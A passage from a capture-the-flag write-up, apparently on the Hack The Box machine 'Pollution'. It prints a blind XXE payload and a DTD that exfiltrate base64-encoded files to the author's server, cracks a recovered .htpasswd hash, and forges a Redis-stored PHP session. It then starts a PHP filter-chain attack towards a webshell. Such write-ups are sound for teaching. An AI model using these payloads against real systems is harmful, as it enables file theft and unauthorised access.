+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 18 Oct 2022 17:40:09 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">15</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+
+<span class="p">{</span><span class="nl">"Status"</span><span class="p">:</span><span class="s2">"Ok"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="file-read">File Read</h3>
+<h4 id="xxe-poc">XXE POC</h4>
+<p>Any time I see XML submitted to a site I’ll want to check for XML External Entity (XXE) Injection. Because nothing I submit is displayed back in the response, this will be a blind injection. I’ll grab a proof of concept from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe">PayLoadsAllTheThings</a>:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"&gt;</span> %ext;
+]&gt;
+<span class="nt">&lt;r&gt;&lt;/r&gt;</span>
+</code></pre></div></div>
+<p>To merge this into the existing payload, I’ll send this POST to Burp Repeater and just add the middle three lines:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>manage_api=<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % ext SYSTEM "http://10.10.14.6/xxe"&gt;</span> %ext;]&gt;<span class="nt">&lt;root&gt;&lt;method&gt;</span>POST<span class="nt">&lt;/method&gt;&lt;uri&gt;</span>/auth/register<span class="nt">&lt;/uri&gt;&lt;user&gt;&lt;username&gt;</span>0xdf<span class="nt">&lt;/username&gt;&lt;password&gt;</span>0xdf<span class="nt">&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>When I send this, the response returns that this user already exists, but there’s also a hit at my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.192 - - [27/Jun/2023 18:32:26] code 404, message File not found
+10.10.11.192 - - [27/Jun/2023 18:32:26] "GET /xxe HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>This is successful XXE injection.</p>
+<h4 id="file-exfil">File Exfil</h4>
+<p>Looking at the next few payloads, I’ll build a payload that will load a DTD (Document Type Definition) file from my server. I’ll simply change the previous payload to request from <code class="language-plaintext highlighter-rouge">/xxe</code> to <code class="language-plaintext highlighter-rouge">xxe.dtd</code>.</p>
+<p><em>Warning: A lot of the payload examples will read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. I’d strongly recommend against this, at least for an initial POC. I’m going to be getting the contents, base64-encoding them, and then making an HTTP GET request back to myself with the results in a GET parameter. The problem with <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is that the base64-encoded version may expand beyond the maximum URL length of some clients, which results in nothing coming back. While there is no standard for maximum URL length, PHP will fail here on <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, which will make me think my payload is bad, when really it’s just not working on this file. <code class="language-plaintext highlighter-rouge">/etc/hostname</code> is a good alternative.</em></p>
+<p>I’ll create <code class="language-plaintext highlighter-rouge">xxe.dtd</code> to create a few more entities:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname"&gt;</span>
+<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://10.10.14.6/?%file;'&gt;</span>"&gt;
+%eval;  
+%exfil;
+</code></pre></div></div>
+<p>The first line creates a parameter called <code class="language-plaintext highlighter-rouge">file</code> that loads the base64-encoded contents of the file <code class="language-plaintext highlighter-rouge">/etc/hostname</code>.</p>
+<p>The next line creates a parameter named <code class="language-plaintext highlighter-rouge">eval</code>, which has a dynamic definition of another entity, <code class="language-plaintext highlighter-rouge">exfil</code>.  It then calls <code class="language-plaintext highlighter-rouge">%eval</code> to load it, thus loading <code class="language-plaintext highlighter-rouge">exfil</code>. Then it invokes <code class="language-plaintext highlighter-rouge">%exfil</code>, which causes the server to try to fetch that web resource. This will fail, but I’ll still get the request with the encoded data.</p>
+<p>When I send the request again, there’s a request for <code class="language-plaintext highlighter-rouge">xxe.dtd</code>, and then the exfil:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.192 - - [27/Jun/2023 18:34:54] "GET /xxe.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Jun/2023 18:34:54] "GET /?cG9sbHV0aW9uCg== HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>That has the hostname:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"cG9sbHV0aW9uCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">pollution
+</span></code></pre></div></div>
+<h3 id="access-developers-site">Access Developers Site</h3>
+<h4 id="collecthtbconf">collect.htb.conf</h4>
+<p>Knowing from enumeration that the server is Apache, I should expect to find the config files for each site in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/</code>. <code class="language-plaintext highlighter-rouge">default.conf</code> and <code class="language-plaintext highlighter-rouge">000-default.conf</code> are some default names to check for, but they both come up empty. It’s common to name the config files after the site names. Fetching <code class="language-plaintext highlighter-rouge">collect.htb.conf</code> works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.192 - - [27/Jun/2023 18:59:33] "GET /xxe.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Jun/2023 18:59:34] "GET /?PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJU2VydmVyTmFtZSBjb2xsZWN0Lmh0YgoJRG9jdW1lbnRSb290IC92YXIvd3d3L2NvbGxlY3QvcHVibGljCgoJIyBBdmFpbGFibGUgbG9nbGV2ZWxzOiB0cmFjZTgsIC4uLiwgdHJhY2UxLCBkZWJ1ZywgaW5mbywgbm90aWNlLCB3YXJuLAoJIyBlcnJvciwgY3JpdCwgYWxlcnQsIGVtZXJnLgoJIyBJdCBpcyBhbHNvIHBvc3NpYmxlIHRvIGNvbmZpZ3VyZSB0aGUgbG9nbGV2ZWwgZm9yIHBhcnRpY3VsYXIKCSMgbW9kdWxlcywgZS5nLgoJI0xvZ0xldmVsIGluZm8gc3NsOndhcm4KCglFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKCUN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCgoJIyBGb3IgbW9zdCBjb25maWd1cmF0aW9uIGZpbGVzIGZyb20gY29uZi1hdmFpbGFibGUvLCB3aGljaCBhcmUKCSMgZW5hYmxlZCBvciBkaXNhYmxlZCBhdCBhIGdsb2JhbCBsZXZlbCwgaXQgaXMgcG9zc2libGUgdG8KCSMgaW5jbHVkZSBhIGxpbmUgZm9yIG9ubHkgb25lIHBhcnRpY3VsYXIgdmlydHVhbCBob3N0LiBGb3IgZXhhbXBsZSB0aGUKCSMgZm9sbG93aW5nIGxpbmUgZW5hYmxlcyB0aGUgQ0dJIGNvbmZpZ3VyYXRpb24gZm9yIHRoaXMgaG9zdCBvbmx5CgkjIGFmdGVyIGl0IGhhcyBiZWVuIGdsb2JhbGx5IGRpc2FibGVkIHdpdGggImEyZGlzY29uZiIuCgkjSW5jbHVkZSBjb25mLWF2YWlsYWJsZS9zZXJ2ZS1jZ2ktYmluLmNvbmYKPC9WaXJ0dWFsSG9zdD4KCiMgdmltOiBzeW50YXg9YXBhY2hlIHRzPTQgc3c9NCBzdHM9NCBzciBub2V0Cg== HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>The config itself (with the default comments snipped) is unremarkable:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost <span class="k">*</span>:80&gt;
+...[snip]...
+        <span class="c">#ServerName www.example.com</span>
+
+        ServerAdmin webmaster@localhost
+        ServerName collect.htb
+        DocumentRoot /var/www/collect/public
+...[snip]...
+
+        ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+        CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+...[snip]...
+&lt;/VirtualHost&gt;
+
+<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div></div>
+<h4 id="forumcollecthtbconf">forum.collect.htb.conf</h4>
+<p>I’ll fetch the <code class="language-plaintext highlighter-rouge">forum.collect.htb.conf</code> config, and there’s not much interesting in here either:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost <span class="k">*</span>:80&gt;
+...[snip]...
+        ServerAdmin webmaster@localhost
+        ServerName forum.collect.htb
+        DocumentRoot /var/www/forum/
+...[snip]...
+
+        ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+        CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+...[snip]...
+&lt;/VirtualHost&gt;
+
+<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div></div>
+<p>It does give the full path to the web root.</p>
+<h4 id="developerscollecthtbconf">developers.collect.htb.conf</h4>
+<p>Updating the DTD file one more time to get the <code class="language-plaintext highlighter-rouge">developers.collect.htb.conf</code> file, this one has a bit more:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost <span class="k">*</span>:80&gt;
+...[snip]...
+        ServerAdmin collect@localhost
+        ServerName developers.collect.htb
+        DocumentRoot /var/www/developers/public
+...[snip]...
+
+        &lt;Directory <span class="s2">"/var/www/developers"</span><span class="o">&gt;</span>
+                AuthType Basic
+                AuthName <span class="s2">"Restricted Content"</span>
+                AuthUserFile /var/www/developers/public/.htpasswd
+                Require valid-user
+        &lt;/Directory&gt;
+
+        ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+        CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+...[snip]...
+&lt;/VirtualHost&gt;
+
+<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div></div>
+<p>In addition to defining the server name and the document root, it defines the restriction that requires creds to get to the site. The credentials are stored in <code class="language-plaintext highlighter-rouge">/var/www/developers/public/.htpasswd</code>.</p>
+<p>I’ll fetch that file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.192 - - [27/Jun/2023 19:00:54] "GET /xxe.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Jun/2023 19:00:54] "GET /?ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg== HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>It decodes to a username and hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="gp">developers_group:$</span>apr1<span class="nv">$MzKA5yXY$DwEz</span>.jxW9USWo8.goD7jY1
+</code></pre></div></div>
+<h4 id="crack-hash">Crack Hash</h4>
+<p>I’ll feed that hash to <code class="language-plaintext highlighter-rouge">hashcat</code> and it detects the hash type, and cracks it very quickly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>hashcat developers_group.hash /usr/share/wordlists/rockyou.txt <span class="nt">--user</span>
+<span class="go">hashcat (v6.2.6) starting in autodetect mode
+...[snip]...
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+</span><span class="gp">1600 | Apache $</span>apr1<span class="nv">$ </span>MD5, md5apr1, MD5 <span class="o">(</span>APR<span class="o">)</span> | FTP, HTTP, SMTP, LDAP Server
+<span class="go">...[snip]...
+</span><span class="gp">developers_group:$</span>apr1<span class="nv">$MzKA5yXY$DwEz</span>.jxW9USWo8.goD7jY1:r0cket
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>Now visiting the site with that username / password grants access.</p>
+<h3 id="access-developers-site-auth">Access Developers Site Auth</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p>With creds, the site is now just a login form:</p>
+<picture>
+<source srcset="/img/image-20221018152923776.webp" type="image/webp"/>
+<img alt="image-20221018152923776" class="include_image" loading="lazy" src="/img/image-20221018152923776.png"/>
+</picture>
+<p>It seems that the first password is to allow only the developers group access, but each person still needs their own auth.</p>
+<p>My creds from the first site don’t work, popping a message box and then redirecting back to the login form:</p>
+<picture>
+<source srcset="/img/image-20221018153004191.webp" type="image/webp"/>
+<img alt="image-20221018153004191" class="include_image" loading="lazy" src="/img/image-20221018153004191.png"/>
+</picture>
+<p>None of the other passwords I’ve collected so far work with some basic guessing of names.</p>
+<h4 id="php-source">PHP Source</h4>
+<p>I’ll exfil the source code for <code class="language-plaintext highlighter-rouge">index.php</code> from the <code class="language-plaintext highlighter-rouge">developers</code> directory:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'./bootstrap.php'</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login.php'</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="k">or</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /?page=home'</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="nv">$view</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+    
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"assets/js/tailwind.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Developers Collect<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"flex flex-col h-screen justify-between"</span><span class="nt">&gt;</span>
+        <span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s2">"header.php"</span><span class="p">);</span> <span class="cp">?&gt;</span>
+        
+        <span class="nt">&lt;main</span> <span class="na">class=</span><span class="s">"mb-auto mx-24"</span><span class="nt">&gt;</span>
+            <span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span> <span class="cp">?&gt;</span>
+        <span class="nt">&lt;/main&gt;</span>
+
+        <span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s2">"footer.php"</span><span class="p">);</span> <span class="cp">?&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+</code></pre></div></div>
+<p>It checks at the top for <code class="language-plaintext highlighter-rouge">auth</code> in my current session. There’s also a pretty clear local file include (LFI) if I can get authenticated, as <code class="language-plaintext highlighter-rouge">$_GET['page'] . ".php"</code> is included without filtering.</p>
+<p>At the top, it loads <code class="language-plaintext highlighter-rouge">bootstrap.php</code> with the <code class="language-plaintext highlighter-rouge">require</code> directive. This file defines the session storage as Redis:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.save_handler'</span><span class="p">,</span> <span class="s1">'redis'</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.save_path'</span><span class="p">,</span> <span class="s1">'tcp://localhost:6379/?auth=COLLECTR3D1SPASS'</span><span class="p">);</span>
+
+<span class="nb">session_start</span><span class="p">();</span>
+</code></pre></div></div>
+<p>It also has the creds!</p>
+<h4 id="update-cookie">Update Cookie</h4>
+<p>Now I can connect to Redis with the password and access the session cookies it is holding:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>redis-cli <span class="nt">-h</span> collect.htb <span class="nt">-a</span> <span class="s1">'COLLECTR3D1SPASS'</span>
+<span class="go">Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+collect.htb:6379&gt; KEYS *
+1) "PHPREDIS_SESSION:r3ra988ri194fe9gtang4g6qvj"
+2) "PHPREDIS_SESSION:e0rr38ohgui9v9k7al982bf04d"
+3) "PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr"
+4) "PHPREDIS_SESSION:nkrdub5ejsh4udkmg16fktbse7"
+5) "PHPREDIS_SESSION:jhnv5hrpr9cp3b7mv1dt7fkiei"
+6) "PHPREDIS_SESSION:0fksesb1irpcrmoimuqru7vog2"
+</span></code></pre></div></div>
+<p>My cookie in Firefox for <code class="language-plaintext highlighter-rouge">developers.collect.htb</code> is <code class="language-plaintext highlighter-rouge">7irvg47mvbp0lumhheo3auijsr</code>, which is the third one. These sessions are flushed frequently, but I can get them back into Redis by logging into the main site or failing to login on the dev site.</p>
+<p>I can view the data for that key and it’s empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">collect.htb:6379&gt;</span><span class="w"> </span>GET PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr
+<span class="go">""
+</span></code></pre></div></div>
+<p>None of the other keys have data either, except the one associated with my session on the main site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">collect.htb:6379&gt;</span><span class="w"> </span>GET PHPREDIS_SESSION:e0rr38ohgui9v9k7al982bf04d
+<span class="go">"username|s:4:\"0xdf\";role|s:5:\"admin\";"
+</span></code></pre></div></div>
+<p>That’s serialized PHP data, which looks like:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">username</code> key:
+    <ul>
+<li><code class="language-plaintext highlighter-rouge">s</code> = string type</li>
+<li>4 bytes long</li>
+<li>value of “0xdf”</li>
+</ul>
+</li>
+<li><code class="language-plaintext highlighter-rouge">role</code> key
+    <ul>
+<li><code class="language-plaintext highlighter-rouge">s</code> = string type</li>
+<li>5 bytes long</li>
+<li>value of “admin”</li>
+</ul>
+</li>
+</ul>
+<p>I know that PHP is looking for an array value named <code class="language-plaintext highlighter-rouge">auth</code> and failing if it is not set or not <code class="language-plaintext highlighter-rouge">True</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">)</span> <span class="p">{</span>            
+    <span class="k">die</span><span class="p">(</span><span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login.php'</span><span class="p">));</span>                                 
+<span class="p">}</span>    
+</code></pre></div></div>
+<p>I can get very similar looking serialized data in a PHP terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>php <span class="nt">-a</span>
+<span class="go">Interactive shell 
+</span><span class="gp">php &gt; </span><span class="nv">$x</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">"username"</span> <span class="o">=&gt;</span> <span class="s2">"0xdf"</span>, <span class="s2">"role"</span> <span class="o">=&gt;</span> <span class="s2">"admin"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">php &gt; </span><span class="nb">echo </span>serialize<span class="o">(</span><span class="nv">$x</span><span class="o">)</span><span class="p">;</span>
+<span class="go">a:2:{s:8:"username";s:4:"0xdf";s:4:"role";s:5:"admin";}
+</span></code></pre></div></div>
+<p>Because the check if <code class="language-plaintext highlighter-rouge">$_SESSION['auth'] != True</code> with only one <code class="language-plaintext highlighter-rouge">=</code>, the types don’t have to match, so I can use a string with any non-empty value:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">collect.htb:6379&gt;</span><span class="w"> </span><span class="nb">set </span>PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr <span class="s2">"auth|s:1:</span><span class="se">\"</span><span class="s2">1</span><span class="se">\"</span><span class="s2">;"</span>
+<span class="go">OK
+</span></code></pre></div></div>
+<p>Alternatively, I can make a boolean value. In PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">php &gt; </span><span class="nv">$x</span> <span class="o">=</span> array<span class="o">(</span><span class="s2">"username"</span> <span class="o">=&gt;</span> <span class="s2">"0xdf"</span>, <span class="s2">"role"</span> <span class="o">=&gt;</span> <span class="s2">"admin"</span>, <span class="s2">"auth"</span> <span class="o">=&gt;</span> True<span class="o">)</span><span class="p">;</span>
+<span class="gp">php &gt; </span><span class="nb">echo </span>serialize<span class="o">(</span><span class="nv">$x</span><span class="o">)</span><span class="p">;</span>
+<span class="go">a:3:{s:8:"username";s:4:"0xdf";s:4:"role";s:5:"admin";s:4:"auth";b:1;}
+</span></code></pre></div></div>
+<p>There’s no length, just the type of <code class="language-plaintext highlighter-rouge">b</code> and the value of <code class="language-plaintext highlighter-rouge">1</code> for True. So in Redis I can:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">collect.htb:6379&gt;</span><span class="w"> </span><span class="nb">set </span>PHPREDIS_SESSION:7irvg47mvbp0lumhheo3auijsr <span class="s2">"auth|b:1;"</span>
+<span class="go">OK
+</span></code></pre></div></div>
+<p>With either of these set with my cookie, visiting <code class="language-plaintext highlighter-rouge">developers.collect.htb</code> redirects to <code class="language-plaintext highlighter-rouge">/?page=home</code> which loads:</p>
+<picture>
+<source srcset="/img/image-20230628172310148.webp" type="image/webp"/>
+<img alt="image-20230628172310148" class="include_image" loading="lazy" src="/img/image-20230628172310148.png"/>
+</picture>
+<h3 id="rce-via-filter-injection">RCE Via Filter Injection</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>The site doesn’t have anything interesting on it.</p>
+<p>I already noted the LFI vulnerability is here:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;main</span> <span class="na">class=</span><span class="s">"mb-auto mx-24"</span><span class="nt">&gt;</span>
+    <span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;/main&gt;</span>
+</code></pre></div></div>
+<p>It is taking user input and passing that to <code class="language-plaintext highlighter-rouge">include</code>. I can use this to read files across the file system, but only if they end in <code class="language-plaintext highlighter-rouge">.php</code>. This exploit gives me access to the source for the site (using PHP filters), but nothing I couldn’t already access with the XXE.</p>
+<h4 id="background">Background</h4>
+<p>When Pollution was released, the PHP filter injection technique was not at all well known. Many in the community learned of it by playing Pollution. Since then, I’ve shown it as an <a href="/2023/01/21/htb-updown.html#beyond-root---lfi2rce-via-php-filters">unintended for UpDown</a> and the intended path for <a href="/2023/04/15/htb-encoding.html#lfi---rce">Encoding</a>. The UpDown post has a lot of detail, and <a href="https://www.youtube.com/watch?v=TnLELBtmZ24">this video</a> goes into detail explaining it:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/TnLELBtmZ24" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The short version is that I will stack filters in such a way that they generate bits of data, and with enough, can actually write the page I want to get included, which will be a simple webshell. It’s a super creative and cool technique.</p>
+<h4 id="poc">POC</h4>
+<p>I’ll use the <a href="https://github.com/synacktiv/php_filter_chain_generator">script from Synacktiv</a> to generate a payload. I can start with a simple <code class="language-plaintext highlighter-rouge">echo</code> to make sure it’s working:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php echo "0xdf was here"; ?&gt;'</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php echo "0xdf was here"; ?&gt; (base64 value: PD9waHAgZWNobyAiMHhkZiB3YXMgaGVyZSI7ID8+)
